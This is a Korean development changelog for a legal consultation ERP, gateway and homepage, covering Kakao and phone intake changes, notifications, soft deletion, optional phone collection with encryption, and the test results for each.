- ERP·gateway typecheck·lint·production build, gateway 134개 테스트, 서비스 워커 syntax와
  `git diff --check`를 통과했다. 이 워크트리에서는 main 병합·운영 배포·실제 수신 canary를
  수행하지 않으며, 운영 반영 시 gateway와 ERP를 같은 릴리스로 배포하고 권한 허용 브라우저
  여러 계정의 실제 수신 알림을 확인한다.

### 2026-08-13 — 전화데스크 담당자 전체 결과 필터·다크 테마 가독성 후보
- 전화데스크 통화 담당자 후보를 현재 페이지 `snapshot.items`에서 만들던 클라이언트 전용
  동작을 제거하고, 선택 기간·출처의 전체 서버 결과에서 중복 없이 반환한다. 담당자 ID는
  ERP same-origin API와 gateway에서 UUID로 검증하며, 전체 결과에 담당자 조건을 적용한 뒤
  총 건수·페이지 수·마지막 유효 페이지와 현재 20/50/100건을 계산한다. ERP 발신은 실제
  발신 직원, 수신·직접 발신은 회선 담당자, 내선은 참여 직원 기준이다. SSE 재동기화도 현재
  담당자·날짜·출처·페이지 크기 조건을 유지한다.
- 다크 테마의 전화데스크·재통화 담당자 `select`와 네이티브 `option`에 배경·글자색을 함께
  지정해 밝은 기본 팝업 배경에서 글자가 사라지는 문제를 막았다. ERP·gateway typecheck·
  lint·production build, gateway 134개 테스트와 `git diff --check`를 통과했다. DB migration·
  운영 배포·운영 데이터 변경은 수행하지 않았고 `PROJECT_PLAN.md`는 v1.33이다. 이 워크트리에서는
  구현 브랜치 commit·push까지만 수행한다.

### 2026-08-13 — 기존고객 자기 생성 사건 제외·리걸프렌즈 등록 완료 배지 후보
- 상담 목록의 전화번호 완전일치 조회를 상담 ID·전화번호·자기 생성 사건 ID 단위로 바꿨다.
  같은 상담의 `legalfriends_case_links.case_idx`와 일치하는 디렉터리 사건은 제외하고도 과거
  사건이 남을 때만 `기존고객`으로 판정한다. 상세의 사건 목록과 판정도 같은 제외 규칙을
  사용한다. 따라서 신규 고객이 `상담하기` 뒤 만든 사건만 동기화된 경우 기존고객으로 바뀌지
  않고, 실제 기존 고객이 새 사건을 만든 경우에는 과거 사건이 남아 기존고객 상태를 유지한다.
- 리걸프렌즈 신건 생성이 성공해 사건 연결 원장이 생긴 상담은 목록·상세에
  `리걸프렌즈 등록 완료`를 별도 표시하며, 실제 기존 고객의 새 사건이면 `기존고객`과 등록
  완료를 함께 표시한다. 목록 검색어에도 새 상태를 포함했다. DB migration이나 리걸프렌즈
  외부 데이터 변경은 없다.
- 전체 5패키지 typecheck·lint·production build, core 81개·gateway 135개 테스트와
  `git diff --check`를 통과했다. 자기 사건만 일치하면 과거 일치 0건, 자기 사건과 과거 사건이
  함께 있으면 과거 사건만 남는 회귀 테스트를 추가했다. `PROJECT_PLAN.md`는 v1.33이다.
  이 워크트리에서는 main 병합·운영 배포·운영 데이터 변경을 수행하지 않는다.
...
### 2026-08-13 — 카카오 첫 메시지에 홈페이지 입력 이름 포함 후보
- 강한 사전 안내의 전송 문장을 `상담 신청합니다`에서
  `홈페이지에 입력한 이름은 {입력 이름}입니다. 상담 요청합니다.`로 바꿨다. 고객이 이름을
  입력하면 안내 박스의 예시 문장에 즉시 반영되며, 카카오 채팅방 이름이 달라도 상담원이 ERP
  접수와 대조할 수 있다는 이유를 함께 설명한다. 이름 입력 전에는 문장이 표시될 자리임을
  안내하고 실제 이름을 임의로 합성하지 않는다.
- 홈페이지 typecheck·ESLint·production build와 `git diff --check`를 통과했다. 390×844
  headless Chrome에서 `김민수` 입력 전후 예시 문장의 실시간 변경, 안내·제출 버튼의 화면 내
  노출, 가로 넘침과 console/hydration 오류 0건을 확인했다. DB·API·카카오 채널 설정 변경은
  없고 `PROJECT_PLAN.md`는 v1.29다. 이 워크트리에서는 main 병합·운영 배포를 수행하지 않는다.

### 2026-08-13 — 홈페이지 카카오 첫 메시지 강한 사전 안내 후보
- 카카오 상담 입력 모달의 제출 버튼 바로 앞에 닫을 수 없는 노란 고대비 안내를 추가했다.
  채팅방을 열기만 해서는 상담원에게 접수되지 않으며 카카오톡으로 이동한 뒤
  `상담 신청합니다`라고 메시지를 한 번 보내야 상담원이 요청을 확인할 수 있다고 세 문장으로
  명시했다. 제출 버튼은 `카카오톡 열고 상담 메시지 보내기`로 바꾸고 버튼 아래에도 메시지
  전송을 한 번 더 안내했다. 별도 필수 체크박스는 추가하지 않았다.
- 홈페이지 typecheck·ESLint·production build와 `git diff --check`를 통과했다. 390×844
  headless Chrome에서 초기 HTML의 모달 입력·버튼 0개, 이름·지역 입력 뒤 제출 버튼 활성화,
  모달 하단 스크롤 후 안내·버튼·보조 문구 전체 노출과 console/hydration 오류 0건을 확인했다.
  DB·API·카카오 채널 설정 변경은 없고 `PROJECT_PLAN.md`는 v1.28이다. 이 워크트리에서는 main
  병합·운영 배포를 수행하지 않는다.

### 2026-08-13 — 홈페이지 카카오 선택 전화번호 후보
- 홈페이지 카카오 상담 모달에 휴대전화 번호를 추가하되 `선택 · 입력하지 않으셔도 돼요`라고
  명시했다. 이름/표시명과 광역 거주지역은 계속 필수이며, 전화번호는 빈 값이면 그대로 접수하고
  입력한 경우에만 `010` 휴대전화 형식을 홈페이지·gateway에서 검증한다. 모바일 390×844에서는
  모달 자체를 안전하게 스크롤하고 등록 액션까지 화면 안에서 접근할 수 있게 했다.
- 선택 번호는 정규화해 요청 AES-GCM 암호문과 상담 HMAC 지문으로 저장하며 ERP에 실제 번호를
  표시한다. 리걸프렌즈 신건에도 실제 번호를 전달하고 미입력 접수만 기존 `010-0000-0000`
  외부 payload 합성을 유지한다. 입력 번호가 리걸프렌즈 고객과 일치하면 카카오 상담도 담당 배정
  전에 `기존 사건 문의/기존 고객의 새 사건/공유 연락처` 처리 게이트를 거친다. 카카오 접수·배정
  알림톡을 만들지 않는 기존 계약은 유지했다. migration `0056_kakao_optional_phone.sql`은 카카오
  채널의 전화 지문·암호문을 모두 있거나 모두 없는 선택값으로 허용하고, 전화 채널 필수·네이버
  무전화 제약은 유지한다. 개인정보처리방침·이용약관·카카오 운영 문서도 선택 수집 기준으로 갱신했다.
- 전체 5패키지 typecheck·lint·production build, core 77개·gateway 121개 테스트, DB schema
  check와 `git diff --check`를 통과했다. 합성한 빈 비식별 `CB` 원천을 둔 임시 PostgreSQL에서
  migration `0000..0056` 57개를 두 번 적용해 멱등성과 두 전화 제약을 확인했다. 리걸프렌즈
  기존 연락처 fixture를 추가한 통합 검증에서 선택 번호 암호화·ERP 복호화, 기존고객 처리 차단,
  `new_matter` 선택 뒤 실번호 신건, 미입력 가상번호 신건, 알림톡 0건과 검증 데이터 전량 정리를
  확인한 뒤 임시 DB·역할을 삭제했다. 390×844 headless Chrome에서는 초기 HTML 모달 입력 0개,
  이름·지역 필수/전화 선택, 빈 전화 유효, 부분 번호 거부, 완성 번호 자동 하이픈·유효, 하단 액션
  노출과 hydration/console 오류 0건을 확인했다. `PROJECT_PLAN.md`는 v1.27이다. 이 워크트리에서는
  main 병합·운영 migration·홈페이지/gateway/ERP 배포·실제 카카오/리걸프렌즈 canary를 하지 않으며,
  운영 반영 시 `0055`·`0056`을 순서대로 먼저 적용하고 세 앱을 같은 통합 릴리스로 배포한다.

### 2026-08-13 — 직원 신규등록 중복·알림톡·관리자 소프트삭제·카카오 지역 필수 후보
- ERP 상담 작업 큐의 일반 `신규등록`도 홈페이지와 같은 7일 중복 판정을 적용했다. 같은
  정규화 이름·전화의 활성 상담에는 요청을 붙이고 배정 전·후 재요청으로 구분하며, 전화만
  같으면 별도 중복 의심 상담을 만든다. 새 상담에만 최초 접수 알림톡 outbox를 만들고 반복
  요청에는 중복 발송하지 않는다. 직원 신규등록 연락처가 리걸프렌즈에 있으면 담당 배정 전에
  기존 사건 문의·기존 고객 새 사건·공유 연락처 처리 게이트를 거치며, 명시적으로 선택한
  기존고객·소개건의 디렉터리 snapshot 흐름은 유지한다.
- 관리자 권한 로그인자에게 직원 `신규등록`으로 시작한 상담의 `삭제` 버튼을 추가했다. 삭제는
  상담·요청·배정·감사 원장을 지우지 않고 `closed` 소프트삭제 시각·관리자를 기록하며, 작업
  큐의 대기·내 상담·확인 필요에서 제외하고 전체 목록·상세 개인정보를 블러 처리한다.
  migration `0055_staff_consultation_soft_delete.sql`은 삭제 컬럼·관리자 FK·인덱스와 종결 상태
  일관성 제약을 추가하고, 개인정보 없는 `consultation.soft_deleted` 이벤트로 SSE 갱신한다.
- 홈페이지 카카오 상담 모달은 이름/표시명과 광역 거주지역을 모두 필수로 받는다. 누락 요청은
  홈페이지·gateway 계약에서 거부하고, 선택 지역은 AES-GCM intake에 보존해 리걸프렌즈 신건
  `living_place`로 전달한다. 배포 전 지역 없는 기존 카카오 접수만 `미수집` 호환값을 사용한다.
  개인정보처리방침·이용약관의 수집 항목과 시행일도 2026-08-13 기준으로 갱신했다.
- 전체 5패키지 typecheck·lint·production build, core 77개·gateway 121개 테스트, DB schema
  check와 `git diff --check`를 통과했다. 합성한 빈 비식별 `CB` 원천을 둔 임시 PostgreSQL에서
  migration `0000..0055` 56개를 한 번에 적용하고 두 번째 실행의 멱등성·새 컬럼·제약을 확인한
  뒤 별도 임시 DB 통합 검증에서 일반 신규 1건·한 시간 뒤 같은 고객 재등록이 한 상담의
  `repeat_unassigned` 요청으로 묶이고 최초 알림톡 1건만 남는 것, 리걸프렌즈 기존고객 게이트와
  관리자 소프트삭제를 원장까지 확인했다. 검증 DB와 임시 역할은 모두 삭제했다. 390×844
  headless Chrome에서 모달 이름·지역 필수,
  이름만 입력한 제출 차단, 두 필드 입력 후 버튼 활성화·화면 내 배치와 hydration 경고 0건을
  확인했다. `PROJECT_PLAN.md`는 v1.26이다. 이 워크트리에서는 main
  병합·운영 migration·홈페이지/gateway/ERP 배포·실제 알림톡/리걸프렌즈/카카오 canary를 하지
  않으며, 운영 반영 시 `0055`를 먼저 적용하고 세 앱을 같은 통합 릴리스로 배포한다.
...
### 2026-08-12 — 자가진단 원·만원 단위 확인 출시 후보
- 홈페이지 자가진단의 월평균 소득·담보 없는 채무·담보부 채무·예상 청산가치 입력 아래에
  현재 금액의 만원·억원 표현을 즉시 표시한다. 양수이면서 10만원 미만인 값을 입력하고
  다음 단계로 이동하면 자동 변환하지 않고 `입력값 × 10,000`의 만원 단위 해석과 정확한
  원 금액을 함께 보여 주며, 고객이 `만원으로 수정/원 단위 그대로 입력/다시 입력` 중 하나를
  명시적으로 선택한다. `0원`은 확인 대상에서 제외하고, 변환값이 필드 상한을 넘으면 변환
  버튼을 표시하지 않는다.
- 공유 자가진단 제출 계약은 미확인 10만원 미만 금액을 거부하고, 고객이 원 단위를 그대로
  확정한 필드명만 받는다. 정상 금액이나 만원으로 수정된 요청은 새 필드를 생략해 구 gateway와
  호환되지만, 원 단위 저액 확정 경로까지 활성화하려면 gateway를 홈페이지보다 먼저 같은
  릴리스로 배포한다. DB migration과 기존 접수 원장 수정은 없다.
- core 68개·gateway 115개 테스트, 전체 5패키지 typecheck·lint, core·db·gateway와 홈페이지
  production build, `git diff --check`를 통과했다. 390×844 headless Chrome에서 월소득
  `210→2,100,000원`, 채무 `4,500→45,000,000원`, 이전 단계 값·만원 요약 보존과 console/
...
### 2026-08-12 — 상담 알림 고객정보 카드·10초 닫힘·즉시 상담하기 후보
- 개인정보 없는 `consultation.requested` SSE에는 계속 상담 ID만 싣고, 이벤트를 받은 ERP의
  유효한 직원 세션이 새 same-origin 최소 조회에서 고객 입력 이름·휴대전화·거주지역·채널·
  접수번호와 배정 가능 여부를 읽는다. 전화가 없는 카카오·네이버는 기존 표시 계약대로
  `010-0000-0000 · 미수집`, 지역이 없으면 `지역 미기록`을 명시한다. SSE·로그·공개 응답에는
  PII를 추가하지 않았다.
- 보이는 ERP 탭의 기존 단순 토스트를 CSS 카드로 바꿨다. 고객명을 헤더에, 거주지역을
  고대비 위치 카드로, 전화·채널·접수번호를 함께 표시하며 모바일 단일 열과 라이트·다크
  테마를 지원한다. 진행 막대와 함께 10초 뒤 자동으로 닫히고 수동 닫기·상세 보기를 제공한다.
  권한 허용 네이티브 Notification도 같은 핵심 정보를 표시하고 10초 뒤 닫히지만, 브라우저
  API 제약상 CSS와 커스텀 버튼은 카드 토스트에만 둔다.
- 카드의 `상담하기`는 새 same-origin POST로 기존 본인 배정 서비스를 실행한다. 성공해야
  상담 상세로 이동하며 전화·카카오 상담은 같은 기존 트랜잭션에서 리걸프렌즈 신건 등록
  outbox를 함께 만든다. 처리 중에는 자동 닫힘을 멈추고 버튼을 잠그며, 충돌·외부 오류는
  카드를 유지해 오류와 재시도 버튼을 보여준다. 다른 직원이 먼저 맡았거나 이름 없는 과거
  카카오처럼 배정 불가한 건은 알림 조회 결과에 따라 상담하기 버튼을 노출하지 않는다.
- 전체 5패키지 typecheck·lint·production build, core 68개·gateway 116개 테스트, DB schema
  check와 `git diff --check`를 통과했다. 새 DB migration과 gateway·core 계약 변경은 없고
  `PROJECT_PLAN.md`는 v1.22다. 이 워크트리 브랜치에 commit·push까지만 수행하며 main 병합·
  운영 배포·운영 상담 생성은 수행하지 않는다.

### 2026-08-12 — 상담 알림 단일 SSE·카카오 가상번호 신건·배정 전후 무효 처리 후보
- 운영 원장을 읽기 전용으로 대조한 결과, 신고된 카카오 접수 `LA-260812-6B3Z9XP4`는
  `상담하기` 시각에 채팅 확인·본인 배정과 감사 원장이 정상 생성됐지만 리걸프렌즈 등록
  이벤트와 사건 연결은 없었다. 당시 계약이 카카오 무전화 배정의 외부 등록을 의도적으로
  막고 있었기 때문이다. gateway·ERP·DB 알림 trigger·LISTEN·SSE 연결에는 관련 서버 오류가
  없었고 운영 데이터·프로세스는 변경하지 않았다.
- ERP 상담 목록 갱신과 전역 알림이 각각 만들던 `/api/consultations/stream` 연결을 브라우저
  모듈 단일 `EventSource`로 합쳤다. 목록이 받는 동일 `consultation.requested` 이벤트를
  알림도 반드시 함께 소비한다. 보이는 탭은 다중 탭 leader 여부와 무관하게 9초 토스트와
  권한 허용 Notification을 모두 실행하고, `localStorage` 접근 실패가 시스템 알림을 막지
  않도록 분리했다. 개인정보 없는 이벤트와 다중 탭 중복 방지 계약은 유지한다.
- 카카오 `상담하기`는 채팅 확인·로그인 직원 본인 배정과 함께 리걸프렌즈 신건 등록을
  요청한다. 상담 DB 전화번호는 계속 `NULL`로 보존하지만 외부 `createForLawnV2` payload에만
  전화 `010-0000-0000`, 거주지역 `미수집`을 합성하고 로그인 직원의 `member_idx`를 보낸다.
  카카오의 과거 간소 intake도 안전한 기본 메모로 변환해 기존 `6B3Z9XP4`처럼 배정만 된
  운영 건이 무효 버튼에서 신건 등록을 보충할 수 있다. 알림톡은 계속 만들지 않는다.
- 상세 우측 상단 무효 처리는 두 상태를 모두 지원한다. 배정 전 pending에서 누르면 일반
  직원 배정 없이 고정 무효 담당자 `lawandfirm_s999`·`member_idx=1824`로 신건 등록하고
  카카오 entry를 invalid·상담을 closed로 만든다. 상담하기 뒤에는 로그인 직원으로 신건
  등록한 다음 `changeManager`로 무효 담당자에 넘긴다. 사건 연결이 아직 없으면 등록 이벤트를
  먼저 처리하고 무효 변경은 5초 뒤 또는 의존성 재시도로 이어져 즉시 연속 클릭도 보존한다.
- 로컬 `lawand_dev`에 누락돼 있던 기존 migration `0050`만 단일 트랜잭션으로 적용한 뒤,
  외부 호출 stub을 사용한 통합 검증에서 가상번호 직원 신건→무효 담당자 변경과 배정 전
  무효 담당자 신건을 모두 원장·payload·사건 연결까지 확인하고 fixture를 전량 정리했다.
  전체 5패키지 typecheck·lint·production build, core 68개·gateway 116개 테스트, DB schema
  check와 `git diff --check`를 통과했다. 새 DB migration은 없고 `PROJECT_PLAN.md`는 v1.21이다.
...
### 2026-08-12 — 전화데스크 필터·검색·담당자 드롭다운 복구 후보
- 전화데스크 서버가 출처 조건으로 조회한 뒤 응답의 최종 `source`를 한 번 더 검증하고,
  ERP 화면도 선택 즉시 같은 조건을 적용한다. `ERP 발신`·`직접 발신`에 수신 행이 남지
  않으며 `진행 중`은 대기·호출·통화 중만 표시한다. root가 연결된 관측 통화의 진행 중
  집계·조회는 legacy 관측 행 대신 화면과 같은 root 상태를 우선한다.
- 현재 페이지 검색은 전화번호·고객명만 대상으로 정리했다. 담당자는 재통화 업무의 필터와
  같은 별도 드롭다운으로 분리하고, 현재 행의 회선 담당자 또는 ERP 발신 요청자를 기준으로
  목록을 즉시 좁힌다. 검색·담당자 필터는 서버 재동기화와 관계없이 현재 화면에 바로
  반영되며 DB·통화 원장·gateway 이벤트 계약은 바꾸지 않았다.
- gateway 테스트 116개, gateway·ERP typecheck·lint·production build와
  `git diff --check`를 통과했다. 구현 커밋 `de8e8f1`은
  `worktree/silver-cloud-3f8f`에 있다. `PROJECT_PLAN.md`는 v1.21이다. 이 워크트리에서는
   main 병합·운영 배포·운영 데이터 변경을 수행하지 않는다.
